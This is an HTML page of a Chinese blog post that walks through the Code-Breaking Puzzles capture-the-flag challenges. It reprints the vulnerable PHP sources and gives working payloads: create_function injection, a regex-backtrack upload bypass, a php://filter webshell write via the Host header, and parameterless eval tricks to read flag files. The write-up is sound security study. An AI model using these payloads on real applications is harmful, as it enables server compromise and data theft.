@@ -1,0 +1,682 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          Code-Breaking Puzzles 题解&amp;学习篇 - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2018/11/Code-Breaking-Puzzles-题解-学习篇/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#代码审计" title="代码审计">代码审计</a>
+                        
+                          <a class="tag" href="/tags/#writeup" title="writeup">writeup</a>
+                        
+                    </div>
+                    <h1>Code-Breaking Puzzles 题解&amp;学习篇</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2018-11-26
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>p神真是相当用心了，弄了个知识星球两周年的活动，有一堆题目质量极高的题。大家感兴趣的可以一起来做下</p>
+<p><a href="https://code-breaking.com" target="_blank" rel="noopener">https://code-breaking.com</a></p>
+<p>比较菜的我就只能学习了。有很多新奇的点，题目确实都很有意思，最后，广告还是要的，欢迎一起加入【代码审计知识星球】</p>
+<p>p神对这几个题目知识点的描述</p>
+<ol>
+<li>function PHP函数利用技巧</li>
+<li>pcrewaf PHP正则特性</li>
+<li>phpmagic PHP写文件技巧</li>
+<li>phplimit PHP代码执行限制绕过</li>
+<li>nodechr Javascript字符串特性</li>
+<li>javacon SPEL表达式沙盒绕过</li>
+<li>lumenserial 反序列化在7.2下的利用</li>
+<li>picklecode Python反序列化沙盒绕过</li>
+<li>thejs Javascript对象特性利用</li>
+</ol>
+<h1 id="function"><a href="#function" class="headerlink" title="function"></a>function</h1><p>源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action = $_GET[<span class="string">'action'</span>] ?? <span class="string">''</span>;</span><br><span class="line">$arg = $_GET[<span class="string">'arg'</span>] ?? <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action)) &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action(<span class="string">''</span>, $arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>环境：</p>
+<ul>
+<li>Apache 2.4.25</li>
+<li>PHP 7.2.12</li>
+</ul>
+<p>第一个限制是<code>preg_match(&#39;/^[a-z0-9_]*$/isD&#39;, $action)</code>，<code>$action</code>中要出现数字字母下划线以外的字符。</p>
+<p>这里可以跑一遍0-128的ascii码，就能知道可以在函数前插入一个<code>\</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Code-Breaking-Puzzles-题解-学习篇/1.png" alt></p>
+<p>具体原理，P神在小密圈也说了</p>
+<blockquote>
+<p>code-breaking puzzles第一题，function，为什么函数前面可以加一个%5c？<br>其实简单的不行，php里默认命名空间是\，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。<br>如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p>
+</blockquote>
+<p>就是<code>\</code>在php中表示默认的命名空间，比如写一些类的时候会在开头写</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">think</span>\<span class="title">db</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Exception</span>;</span><br></pre></td></tr></table></figure>
+<p>然后就是需要找一个第二个参数可以引发危险的函数。</p>
+<p>我一开始确实也想到了<code>create_function</code>函数，但是根据手册的用法，他会返回一个函数。然而后面并没有地方会重新来调用这个函数。</p>
+<p>看完wp之后看到 <a href="http://blog.51cto.com/lovexm/1743442" target="_blank" rel="noopener">http://blog.51cto.com/lovexm/1743442</a></p>
+<p><code>create_function</code>在构建函数的时候，也是使用的字符串拼接的方式，将第二个参数的<code>$code</code>传入到其中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"function lambda()&#123;"</span>.$code.<span class="string">"&#125;"</span></span><br></pre></td></tr></table></figure>
+<p>然后动态执行。这样一来就可以进行<strong>注入</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>;&#125;phpinfo();<span class="comment">/*</span></span><br></pre></td></tr></table></figure>
+<p>说点题外的，类似的eval也是将其中的字符串与进行拼接</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"&lt;?php "</span>.$code.<span class="string">"?&gt;"</span></span><br></pre></td></tr></table></figure>
+<p>从而可以传入图<code>?&gt;</code>、<code>&lt;?php</code>闭合前后的标签，让中间的代码块不会被当作php代码执行。</p>
+<p>到了这里，也就差不多了。虽然系统里禁用了<code>system</code>、<code>exec</code>之类的函数，但是，只要可以读文件就可以拿到flag了</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">51.158</span>.<span class="number">75.42</span>:<span class="number">8087</span>/?action=\create_function&amp;<span class="keyword">arg</span>=<span class="number">1</span>;&#125;print_r(scandir(<span class="string">'../'</span>));/*</span><br><span class="line"></span><br><span class="line">http://<span class="number">51.158</span>.<span class="number">75.42</span>:<span class="number">8087</span>/?action=\create_function&amp;<span class="keyword">arg</span>=<span class="number">1</span>;&#125;print_r(file_get_contents(<span class="string">'../flag_h0w2execute_arb1trary_c0de'</span>));/*</span><br></pre></td></tr></table></figure>
+<h1 id="pcrewaf"><a href="#pcrewaf" class="headerlink" title="pcrewaf"></a>pcrewaf</h1><p>环境：</p>
+<ul>
+<li>Apache 2.4.25</li>
+<li>PHP 7.1.24</li>
+</ul>
+<p>题目源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_FILES)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$user_dir = <span class="string">'data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">$data = file_get_contents($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> (is_php($data)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"bad request"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    @mkdir($user_dir, <span class="number">0755</span>);</span><br><span class="line">    $path = $user_dir . <span class="string">'/'</span> . random_int(<span class="number">0</span>, <span class="number">10</span>) . <span class="string">'.php'</span>;</span><br><span class="line">    move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], $path);</span><br><span class="line"></span><br><span class="line">    header(<span class="string">"Location: $path"</span>, <span class="keyword">true</span>, <span class="number">303</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，最主要就是绕过<code>is_php</code>函数的限制</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_php</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_match(<span class="string">'/&lt;\?.*[(`;?&gt;].*/is'</span>, $data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这里可以看到利用正则限制了<code>&lt;?php</code>后不能添加( ` ; ? &gt;这些字符，也就难以构造一个完整的php代码。</p>
+<p>这里需要涉及到正则匹配的流程，正则匹配有两种引擎</p>
+<blockquote>
+<ul>
+<li>DFA: 从起始状态开始，一个字符一个字符地读取输入串，并根据正则来一步步确定至下一个转移状态，直到匹配不上或走完整个输入</li>
+<li>NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态</li>
+</ul>
+</blockquote>
+<p>php的PCRE库使用的就是NFA的正则引擎，就会涉及到回溯的一个过程。（偷一张p神的图</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Code-Breaking-Puzzles-题解-学习篇/2.png" alt></p>
+<p>可以看到，一开始<code>.*</code>会将后面的全部字符匹配到，然后为了匹配</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(`;?&gt;]</span><br></pre></td></tr></table></figure>
+<p> 然后就会一个字符一个字符的回溯，直到匹配到最后的<code>;</code> ，才会进行下一个<code>.*</code>的匹配</p>
+<p>PHP为了防止正则表达式的拒绝服务攻击（回溯次数过多），限制了回溯的次数</p>
+<p>这个次数对应着php_ini中的<code>pcre.backtrack_limit</code></p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Code-Breaking-Puzzles-题解-学习篇/3.png" alt></p>
+<p> 貌似在php5.2及之前这个次数为100000，之后一直到如今的7.2都是1000000</p>
+<p>当回溯的次数超过这个限制的时候，会返回一个<code>false</code> （匹配成功返回<code>1</code>，匹配失败返回的是<code>0</code></p>
+<p>当单纯的用if进行判断的时候，就会绕过条件判断，成功上传文件。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">"shell.txt"</span>, <span class="string">"w+"</span>) <span class="keyword">as</span> f:</span><br><span class="line">	f.write(<span class="string">"&lt;?php print_r(scandir('../../../'));print_r(file_get_contents('../../../flag_php7_2_1s_c0rrect'));/*"</span>+<span class="string">'A'</span>*<span class="number">1000000</span>)</span><br></pre></td></tr></table></figure>
+<p> 上传这个文件，就可以成功绕过正则。</p>
+<p>官方文档对此也特定做了警告</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Code-Breaking-Puzzles-题解-学习篇/4.png" alt></p>
+<p>需要用强等于的方式来判断匹配的结果</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (is_php($data) === <span class="number">0</span>)&#123; </span><br><span class="line">    write ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="phpmagic"><a href="#phpmagic" class="headerlink" title="phpmagic"></a>phpmagic</h1><p>源码（删掉了html的部分</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'read-source'</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(show_source(<span class="keyword">__FILE__</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">define(<span class="string">'DATA_DIR'</span>, dirname(<span class="keyword">__FILE__</span>) . <span class="string">'/data/'</span> . md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!is_dir(DATA_DIR)) &#123;</span><br><span class="line">    mkdir(DATA_DIR, <span class="number">0755</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line">chdir(DATA_DIR);</span><br><span class="line"></span><br><span class="line">$domain = <span class="keyword">isset</span>($_POST[<span class="string">'domain'</span>]) ? $_POST[<span class="string">'domain'</span>] : <span class="string">''</span>;</span><br><span class="line">$log_name = <span class="keyword">isset</span>($_POST[<span class="string">'log'</span>]) ? $_POST[<span class="string">'log'</span>] : date(<span class="string">'-Y-m-d'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST) &amp;&amp; $domain):</span><br><span class="line">                $command = sprintf(<span class="string">"dig -t A -q %s"</span>, escapeshellarg($domain));</span><br><span class="line">                $output = shell_exec($command);</span><br><span class="line">                $output = htmlspecialchars($output, ENT_HTML401 | ENT_QUOTES);</span><br><span class="line">                $log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line">                <span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span><br><span class="line">                    file_put_contents($log_name, $output);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">echo</span> $output;</span><br><span class="line">            <span class="keyword">endif</span>; <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>既然给了提示说是php文件写入，那就把目光放在了写文件的地方</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$log_name = $_SERVER[<span class="string">'SERVER_NAME'</span>] . $log_name;</span><br><span class="line"><span class="keyword">if</span>(!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)) &#123;</span><br><span class="line">    file_put_contents($log_name, $output);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到，文件名是由<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>和<code>$log_name</code>两部分组成的。</p>
+<p><code>$log_name</code>可以由<code>$_POST[&#39;log&#39;]</code>来控制，至于<code>$_SERVER[&#39;SERVER_NAME&#39;]</code>一开始我是以为不能控制的，后来改了下<code>Host</code>头部发现也是可以控制的，看了下这个参数的含义</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Code-Breaking-Puzzles-题解-学习篇/5.png" alt></p>
+<p>可以看到官方也给了相应的提示，在Apache2中没有进行相应设置的话，这个值是会由客户端进行提供。</p>
+<p>这样文件名完全可控之后，事情就变的好办了。后面的if判断也相对比较好绕</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!in_array(pathinfo($log_name, PATHINFO_EXTENSION), [<span class="string">'php'</span>, <span class="string">'php3'</span>, <span class="string">'php4'</span>, <span class="string">'php5'</span>, <span class="string">'phtml'</span>, <span class="string">'pht'</span>], <span class="keyword">true</span>)</span><br></pre></td></tr></table></figure>
+<p>可以看到就判断了下文件后缀，但并没有以获取到的文件后缀当作写入文件的后缀，就可以利用<code>shell.php/.</code>的方式绕过</p>
+<p>然后就是写入的文件，可以先看下写入文件的内容，可以看到输出的文件内容中，有一小部分是我们可以控制的</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Code-Breaking-Puzzles-题解-学习篇/6.png" alt></p>
+<p>但是不能插入尖括号这些html字符，因为进行了一次转义。然后我就想到了p神之前的一篇文章</p>
+<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+<p>利用php的伪协议，就可以控制写入文件的方式，这个思路其实在hitcon的一句话题目里也有，但是比这个难多了。</p>
+<p>一开始需要判断一下前面符合base64格式的字符正好是4的倍数，就不需要添加额外字符，否则添加到4的倍数即可。</p>
+<p>后面的内容用base64编码写入即可，最后的payload</p>
+<p>（一个小问题，由于<code>dig</code>接受的参数不允许过长，否则直接返回空，所以payload需要尽可能的短一些</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Host</span>: php</span><br><span class="line"></span><br><span class="line">domain=PD89YGNhdCAnLi4vLi4vLi4vZmxhZ19waHBtYWcxY191cjEnYDsvKioq&amp;log=://filter/write=convert.base64-decode/resource=0.php/.</span><br></pre></td></tr></table></figure>
+<h1 id="phplimit"><a href="#phplimit" class="headerlink" title="phplimit"></a>phplimit</h1><p>环境：</p>
+<ul>
+<li>Nginx：1.15.6</li>
+<li>PHP：5.6.38</li>
+</ul>
+<p>代码执行的绕过限制，源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>限制了只允许多重嵌套函数的方式，并且最里面的函数不允许添加参数。</p>
+<p>这里学习的成分比较大，记录了下看到的师傅们的各种解法。</p>
+<h2 id="session-id"><a href="#session-id" class="headerlink" title="session_id"></a>session_id</h2><p>session_id用于设置和获取当前的会话id，也就是<code>PHPSESSID</code>的值</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Code-Breaking-Puzzles-题解-学习篇/7.png" alt></p>
+<p>emmm但是看到了一种这样的写法，感觉php的黑魔法也太可怕了把</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session_id(session_start())</span><br></pre></td></tr></table></figure>
+<p>然后就可以将想要获取的变量值转义到了<code>PHPSESSID</code>上，之后的事情就应该会比较好办。</p>
+<p>虽然<code>PHPSESSID</code>中不允许一些<code>[a-zA-Z0-9_]</code>之外的字符串出现，但是问题应该不大</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Code-Breaking-Puzzles-题解-学习篇/8.png" alt></p>
+<p>有那么多编码格式转换的函数，这里找了一个<code>hex2bin</code>就能比较轻松的解决这个问题</p>
+<p>最后payload</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="builtin-name">GET</span> /?<span class="attribute">code</span>=eval(hex2bin(session_id(session_start())));</span><br><span class="line"></span><br><span class="line"><span class="attribute">PHPSESSID</span>=7072696e745f722866696c655f6765745f636f6e74656e747328272e2e2f666c61675f7068706279703473732729293b</span><br></pre></td></tr></table></figure>
+<h2 id="get-defined-vars"><a href="#get-defined-vars" class="headerlink" title="get_defined_vars"></a>get_defined_vars</h2><p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/blog-archive/Code-Breaking-Puzzles-题解-学习篇/9.png" alt></p>
+<p>用于返回定义的全部变量，这样就相当于可以获取任意位置传入变量值。就可以通过<code>next</code>、<code>current</code>来操纵这个数组，就可以获取到想要的变量值。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//51.158.75.42:8084/</span></span><br><span class="line">?code=<span class="keyword">eval</span>(next(current(get_defined_vars())));</span><br><span class="line">&amp;b=print_r(scandir(<span class="string">'../'</span>));print_r(file_get_contents(<span class="string">'../flag_phpbyp4ss'</span>));</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>在Apache中还可以利用<code>getallheaders</code>去获取http头，但是这里的webserver是Nginx，所以没有这个函数</p>
+<p>另外在php 7.1下，<code>getenv()</code>函数新增了无参数时会获取服务段的env数据，这个时候也可以利用</p>
+</blockquote>
+<p>还有个师傅的exp，学习一下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">code=readfile(next(array_reverse(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure>
+<h1 id="nodechr"><a href="#nodechr" class="headerlink" title="nodechr"></a>nodechr</h1><p>这道题本来不是很想做的，因为确实不会nodejs。但是貌似又涉及到之前XSS的部分，又影响python的编码。所以想重点记录下知识点，而不是题解。</p>
+<h2 id="先说题解"><a href="#先说题解" class="headerlink" title="先说题解"></a>先说题解</h2><p>只贴比较重要的一部分代码</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safeKeyword</span>(<span class="params">keyword</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(isString(keyword) &amp;&amp; !keyword.match(<span class="regexp">/(union|select|;|\-\-)/i</span>s)) &#123;</span><br><span class="line">        <span class="keyword">return</span> keyword</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">undefined</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> username = safeKeyword(ctx.request.body[<span class="string">'username'</span>])</span><br><span class="line"><span class="keyword">let</span> password = safeKeyword(ctx.request.body[<span class="string">'password'</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> jump = ctx.router.url(<span class="string">'login'</span>)</span><br><span class="line"><span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">    <span class="keyword">let</span> user = <span class="keyword">await</span> ctx.db.get(<span class="string">`SELECT * FROM "users" WHERE "username" = '<span class="subst">$&#123;username.toUpperCase()&#125;</span>' AND "password" = '<span class="subst">$&#123;password.toUpperCase()&#125;</span>'`</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (user) &#123;</span><br><span class="line">        ctx.session.user = user</span><br><span class="line">        jump = ctx.router.url(<span class="string">'admin'</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到这里用正则过滤了select和union，导致无法获取数据库中的flag。</p>
+<p>重点就在于在数据在匹配完之后，再进行了一次<code>toUpperCase()</code>，具体可以看p神的这篇文章</p>
